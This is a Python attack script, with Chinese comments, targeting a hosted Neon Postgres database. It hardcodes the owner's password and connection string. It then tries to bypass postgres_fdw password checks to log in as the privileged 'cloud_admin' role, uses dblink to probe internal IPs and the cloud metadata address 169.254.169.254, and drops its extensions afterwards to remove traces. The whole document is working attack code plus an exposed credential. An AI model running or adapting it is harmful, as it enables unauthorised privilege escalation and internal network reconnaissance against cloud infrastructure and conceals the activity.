# -*- coding: utf-8 -*-
"""fdw password_required=false 绕过变体 + 短超时内网探测 + 残留清理"""
import psycopg

PWD = 'npg_cI5ynlaAqjU2'
HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI = 'postgresql://neondb_owner:%s@%s/neondb' % (PWD, HOST)

c = psycopg.connect(URI, connect_timeout=20)
c.autocommit = True
cur = c.cursor()

def q(sql):
    try:
        cur.execute(sql)
        try:
            return cur.fetchall()
        except Exception:
            return 'OK(no rows)'
    except Exception as e:
        return 'ERR: %s' % str(e)[:200]

print('=== 残留检查 ===')
print('ext:', q("SELECT extname FROM pg_extension WHERE extname IN ('postgres_fdw','dblink')"))
print('srv:', q("SELECT srvname FROM pg_foreign_server"))
print('ft:', q("SELECT relname FROM pg_class WHERE relname LIKE 'k_fdw%'"))

print('\n=== [G] password_required=false 绕过变体 ===')
print('先确保扩展在:', q("CREATE EXTENSION IF NOT EXISTS postgres_fdw"))

def probe(name, dbname, user, opts_extra):
    opt = "user '%s', %s" % (user, opts_extra)
    try:
        cur.execute("CREATE SERVER %s FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host '127.0.0.1', port '5432', dbname '%s')" % (name, dbname))
        cur.execute("CREATE USER MAPPING FOR CURRENT_USER SERVER %s OPTIONS (%s)" % (name, opt))
        cur.execute("CREATE FOREIGN TABLE %s_t (id int) SERVER %s OPTIONS (schema_name 'public', table_name 'health_check')" % (name, name))
    except Exception as e:
        return '%s -> ERR at setup: %s' % (name, str(e)[:200])
    try:
        cur.execute("SELECT * FROM %s_t LIMIT 1" % name)
        return '%s -> CONNECTED! %s' % (name, cur.fetchall())
    except Exception as e:
        return '%s -> query ERR: %s' % (name, str(e)[:250])
    finally:
        for d in ("DROP FOREIGN TABLE IF EXISTS %s_t" % name,
                  "DROP SERVER IF EXISTS %s CASCADE" % name):
            try: cur.execute(d)
            except Exception: pass

print('\n[G1] cloud_admin 无密码 + password_required=false')
print(probe('k_fdw_g1', 'postgres', 'cloud_admin', "password_required 'false'"))
print('\n[G2] cloud_admin 假密码 + password_required=false')
print(probe('k_fdw_g2', 'postgres', 'cloud_admin', "password 'wrongpass', password_required 'false'"))
print('\n[G3] neondb_owner 真密码 + password_required=false (对照)')
print(probe('k_fdw_g3', 'postgres', 'neondb_owner', "password '%s', password_required 'false'" % PWD))

print('\n=== 内网端口短超时探测(compute 视角) ===')
print(q("CREATE EXTENSION IF NOT EXISTS dblink"))
import time
targets = [
    ('172.16.0.1', '5432'),
    ('10.0.0.1', '5432'),
    ('169.254.169.254', '80'),   # 云 metadata
    ('169.254.169.254', '5432'),
]
for ip, port in targets:
    t0 = time.time()
    r = q("SELECT dblink_connect('k_p', 'host=%s port=%s dbname=postgres user=x password=y connect_timeout=2')" % (ip, port))
    dt = time.time() - t0
    print('  %s:%s -> %s (%.1fs)' % (ip, port, r, dt))
    try:
        cur.execute("SELECT dblink_disconnect('k_p')")
    except Exception:
        pass

print('\n=== 清理 ===')
print(q("DROP EXTENSION IF EXISTS postgres_fdw CASCADE"))
print(q("DROP EXTENSION IF EXISTS dblink CASCADE"))
print(q("SELECT extname FROM pg_extension WHERE extname IN ('postgres_fdw','dblink')"))
print(q("SELECT srvname FROM pg_foreign_server"))
print(q("SELECT count(*) FROM pg_user_mapping"))
c.close()
